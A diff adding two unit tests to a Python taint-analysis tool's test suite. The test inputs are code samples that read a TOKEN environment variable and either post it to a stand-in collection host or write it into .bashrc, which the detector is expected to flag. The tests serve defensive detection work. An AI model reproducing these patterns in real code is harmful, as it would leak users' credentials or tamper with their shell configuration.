@@ -64,6 +64,20 @@ class TaintAnalyzerTests(unittest.TestCase):
         )
         self.assertIn("T001", self._rules_for(code))
 
+    def test_alias_sink_and_attribute_taint(self) -> None:
+        code = (
+            "import os, requests as rq\n"
+            "def send(self):\n"
+            "    self.token = os.getenv('TOKEN')\n"
+            "    post = rq.post\n"
+            "    post('http://example.invalid/collect', data=self.token)\n"
+        )
+        self.assertIn("T001", self._rules_for(code))
+
+    def test_sensitive_to_suspicious_file_write(self) -> None:
+        code = "import os\ntoken = os.getenv('TOKEN')\nopen('.bashrc', 'w').write(token)\n"
+        self.assertIn("T008", self._rules_for(code))
+
 
 if __name__ == "__main__":
     unittest.main()
